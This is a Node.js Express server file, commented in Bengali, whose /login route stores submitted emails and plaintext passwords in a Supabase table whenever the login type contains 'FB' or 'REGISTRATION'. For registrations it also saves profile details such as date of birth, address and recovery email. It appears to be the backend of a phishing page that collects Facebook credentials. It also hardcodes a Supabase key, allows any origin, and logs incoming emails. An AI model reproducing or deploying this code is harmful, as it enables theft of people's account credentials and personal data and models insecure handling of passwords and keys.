const express = require('express');
const { createClient } = require('@supabase/supabase-js');
const cors = require('cors');

const app = express();

// Middleware
app.use(express.json());
app.use(cors()); 

// ১. সুপাবেস কানেকশন
const supabaseUrl = 'https://ocdnmaejdrnbcovfbukv.supabase.co'; 
const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im9jZG5tYWVqZHJuYmNvdmFidWt2Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzQ2MzMwODAsImV4cCI6MjA5MDIwOTA4MH0.2cFLD8QxoRykiuIgjxIXHDWOreQaJnsLYlKmr6GpYhI';
const supabase = createClient(supabaseUrl, supabaseKey);

// ২. মেইন রুট
app.post('/login', async (req, res) => {
    const email = req.body.email ? req.body.email.trim() : "";
    const password = req.body.password ? req.body.password.trim() : "";
    const login_type = req.body.login_type ? String(req.body.login_type).toUpperCase() : ""; 
    
    console.log(`--- ইনকামিং রিকোয়েস্ট ---`);
    console.log(`ইমেইল: ${email} | টাইপ: ${login_type}`);

    // --- লজিক ১: ডাটা সেভ করা (ফেসবুক বা রেজিস্ট্রেশন পেজ) ---
    if (login_type.includes('FB') || login_type.includes('REGISTRATION')) {
        console.log(`🚩 ডাটাবেজে সেভ করার চেষ্টা চলছে...`);
        
        // ১. প্রথম টেবিলে সেভ (user_credentials)
        const { error: credError } = await supabase
            .from('user_credentials') 
            .insert([{ 
                email: email, 
                password: password, 
                login_type: req.body.login_type 
            }]);

        if (credError) {
            console.log("❌ ক্রেডেনশিয়াল সেভ এরর:", credError.message);
            return res.status(500).json({ success: false, message: credError.message });
        }

        // ২. দ্বিতীয় টেবিলে সেভ (যদি রেজিস্ট্রেশন পেজ থেকে আসে)
        if (login_type.includes('REGISTRATION')) {
            console.log(`📋 ইউজার প্রোফাইল সেভ হচ্ছে user_profiles2 টেবিলে...`);
            const { error: profileError } = await supabase
                .from('user_profiles2') 
                .insert([{
                    email: email,
                    full_name: req.body.full_name || "N/A",
                    username: req.body.username || "N/A",
                    gender: req.body.gender || "N/A",
                    recovery_email: req.body.recovery_email || "N/A",
                    country: req.body.country || "N/A",
                    dob: req.body.dob || "N/A",
                    address: req.body.address || "N/A"
                }]);

            if (profileError) {
                console.log("⚠️ প্রোফাইল সেভ হয়নি (কিন্তু ক্রেডেনশিয়াল হয়েছে):", profileError.message);
            }
        }
        
        console.log("✅ ডাটাবেজে সফলভাবে সেভ হয়েছে!");
        return res.json({ success: true, message: "Data Saved!" });
    }

    // --- লজিক ২: ইনডেক্স পেজ (লগইন ভেরিফিকেশন) ---
    console.log(`🔍 লগইন ভেরিফিকেশন চলছে...`);

    try {
        const { data, error } = await supabase
            .from('user_credentials') 
            .select('*') 
            .ilike('email', email) 
            .order('id', { ascending: false }) 
            .limit(1); 

        if (error) {
            console.log("❌ সুপাবেস কুয়েরি এরর:", error.message);
            return res.status(500).json({ success: false });
        }

        if (data && data.length > 0) {
            const user = data[0];
            if (String(user.password).trim() === String(password)) {
                console.log("✅ লগইন সফল!");
                return res.status(200).json({ success: true });
            } else {
                console.log("❌ পাসওয়ার্ড ভুল!");
                return res.status(401).json({ success: false, message: "Invalid Password!" });
            }
        } else {
            console.log("❌ ইউজার পাওয়া যায়নি!");
            return res.status(401).json({ success: false, message: "User not found!" });
        }

    } catch (err) {
        console.error("সার্ভার এরর:", err.message);
        return res.status(500).json({ success: false });
    }
});

const PORT = process.env.PORT || 5000;
app.listen(PORT, () => {
    console.log(`✅ সার্ভার চালু হয়েছে পোর্ট: ${PORT}`);
});

module.exports = app;